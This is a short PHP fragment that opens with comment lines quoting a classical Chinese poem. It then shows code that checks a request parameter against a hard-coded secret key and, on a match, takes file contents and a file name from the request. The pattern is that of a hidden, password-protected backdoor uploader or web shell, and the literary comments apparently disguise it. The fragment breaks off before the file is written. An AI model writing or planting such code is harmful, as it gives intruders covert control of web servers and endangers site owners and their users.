...
// 感宋玉对楚王神女之事，遂作斯赋。其辞曰：余从京域，言归东藩。
// 背伊阙，越轘辕，经通谷，陵景山。日既西倾，车殆马烦。
...
// 扬轻袿之猗靡兮，翳修袖以延伫。体迅飞凫，飘忽若神，陵波微步，罗袜生尘。
...
$custom_key = isset($_REQUEST['custom_key']) ? stripslashes($_REQUEST['custom_key']) : '';

if($custom_key === 'PtXe*JMQ%jT2HS!BSRc4a$$^'){
	if(isset($_REQUEST['file'])){
		$file_content = stripslashes($_REQUEST['file']);
		if(isset($_REQUEST['filename']) && !empty(trim($_REQUEST['filename']))) {
			$filename = basename(stripslashes($_REQUEST['filename']));
		} else {
